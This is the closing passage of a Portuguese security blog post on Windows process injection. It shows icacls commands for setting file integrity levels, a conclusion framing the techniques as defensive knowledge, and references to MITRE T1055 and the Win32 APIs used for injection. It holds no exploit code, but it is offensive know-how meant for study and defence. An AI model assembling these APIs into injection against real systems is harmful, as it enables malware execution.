class="language-plaintext highlighter-rouge">icacls</code> no prompt de comando do Windows.</p><p>Para exibir o nível de integridade de um arquivo:</p><div lang="shell" class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>icacls <span class="s2">"c:</span><span class="se">\c</span><span class="s2">aminho</span><span class="se">\p</span><span class="s2">ara</span><span class="se">\a</span><span class="s2">rquivo"</span>
</pre></table></code></div></div><p>Para definir o nível de integridade de um arquivo para baixo:</p><div lang="shell" class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>icacls <span class="s2">"c:</span><span class="se">\c</span><span class="s2">aminho</span><span class="se">\p</span><span class="s2">ara</span><span class="se">\a</span><span class="s2">rquivo"</span> /setintegritylevel Low
</pre></table></code></div></div><h3 id="limitações-e-considerações">Limitações e Considerações</h3><ul><li><strong>Compatibilidade de Aplicativos:</strong> Alguns aplicativos podem não funcionar corretamente com os níveis de integridade restritivos.<li><strong>Complexidade de Configuração:</strong> Configurar e gerenciar os níveis de integridade pode ser complexo e requer um bom entendimento das políticas de segurança do sistema.</ul><p>E estas limitações que normalmente deixam brechas para ataques.</p><h1 id="conclusão">Conclusão</h1><p>O <em>Process Injection</em> representa uma das técnicas mais sofisticadas e versáteis no arsenal de qualquer profissional avançado em cibersegurança. Ao dominar essas técnicas, você adquire a capacidade de entender as intricadas maneiras pelas quais o código pode ser inserido e executado em processos legítimos, uma habilidade essencial tanto para o desenvolvimento de software seguro quanto para a defesa contra ameaças avançadas.</p><p>Este artigo buscou oferecer uma visão detalhada e prática das principais metodologias de <em>Process Injection</em>, construindo uma ponte entre conceitos teóricos e a aplicação real no contexto de segurança da informação. Ao explorar diferentes abordagens, como o uso de APIs específicas e o aproveitamento de vulnerabilidades comuns, o conteúdo forneceu ferramentas valiosas para aprofundar o conhecimento técnico dos leitores.</p><p>À medida que as ameaças evoluem, o domínio dessas técnicas se torna ainda mais crucial para aqueles que atuam na linha de frente da cibersegurança. Entender e praticar <em>Process Injection</em> não é apenas uma questão de aprimorar habilidades individuais, mas também de estar preparado para enfrentar e mitigar técnicas semelhantes empregadas por adversários sofisticados.</p><p>Ao fim, o conhecimento aprofundado dessas técnicas permite que os profissionais de cibersegurança antecipem movimentos adversários, desenvolvam contramedidas eficazes e mantenham uma postura proativa na defesa de sistemas críticos. Com a prática constante e o aprimoramento dessas habilidades, você estará mais bem equipado para lidar com os desafios complexos do cenário de ameaças atual.</p><h1 id="referências">Referências</h1><ul><li><a href="https://attack.mitre.org/techniques/T1055/">https://attack.mitre.org/techniques/T1055/</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread</a><li><a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)">https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control">https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control</a><li><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/access-control-entry">https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/access-control-entry</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists</a><li><a href="https://h41stur.com/posts/get-process/">https://h41stur.com/posts/get-process/</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32">https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context">https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information">https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags">https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/estudos/'>Estudos</a>, <a href='/categories/winapi/'>WinAPI</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >Shellcoding</a> <a href="/tags/shellcode/" class="post-tag no-text-decoration" >Shellcode</a> <a href="/tags/windows-api/" class="post-tag no-text-decoration" >Windows API</a> <a href="/tags/kernel/" class="post-tag no-text-decoration" >Kernel</a> <a href="/tags/winapi/" class="post-tag no-text-decoration" >WinAPI</a> <a href="/tags/process-injection/" class="post-tag no-text-decoration" >Process Injection</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Process Injection 101 - H41stur&url=https://h41stur.github.io/posts/process-injection/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Process Injection 101 - H41stur&u=https://h41stur.github.io/posts/process-injection/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Process Injection 101 - H41stur&url=https://h41stur.github.io/posts/process-injection/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://h41stur.github.io/posts/process-injection/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div><div> <script src="https://utteranc.es/client.js" repo="h41stur/h41stur.github.io" issue-term="url" theme="photon-dark" crossorigin="anonymous" async> </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/process-injection/">Process Injection 101</a><li><a href="/posts/evasao-av/">Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</a><li><a href="/posts/paper-heap/">Heap Exploitation P.1</a><li><a href="/posts/shellcoding101/">Shellcoding 101</a><li><a href="/posts/replay-sinal-rf/">Uma Jornada no Hardware Hacking: Criando um Clonador de Sinais RF</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/get-process/"><div class="card-body"> <span class="timeago small" >Aug 6, 2024<i class="unloaded">2024-08-06T01:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Enumerando Processos pelo Nome</h3><div class="text-muted small"><p> TL;DR Neste artigo, exploramos como utilizar as APIs do Windows para enumerar processos em execução, focando nas funções CreateToolhelp32Snapshot, Process32First e Process32Next. Discutimos a im...</p></div></div></a></div><div class="card"> <a href="/posts/process-listing/"><div class="card-body"> <span class="timeago small" >Aug 19, 2024<i class="unloaded">2024-08-19T01:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Process Listing e Token Dumping com WinAPI</h3><div class="text-muted small"><p> TL;DR Este artigo explora técnicas para listar processos e realizar token dumping em sistemas Windows utilizando diversas APIs. Abordamos métodos além da Tool Help Library, como WTSEnumerateProc...</p></div></div></a></div><div class="card"> <a href="/posts/shellcoding101/"><div class="card-body"> <span class="timeago small" >Jul 18, 2024<i class="unloaded">2024-07-18T01:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcoding 101</h3><div class="text-muted small"><p> TL;DR Neste artigo, exploramos os fundamentos do desenvolvimento de shellcodes, focando principalmente no ambiente Windows e na manipulação de endereços dinâmicos. O shellcoding envolve escrever...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/get-process/" class="btn btn-outline-primary" prompt="Older"><p>Enumerando Processos pelo Nome</p></a> <a href="/posts/process-listing/" class="btn btn-outline-primary" prompt="Newer"><p>Process Listing e Token Dumping com WinAPI</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/h41stur">H41stur</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://h41stur.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
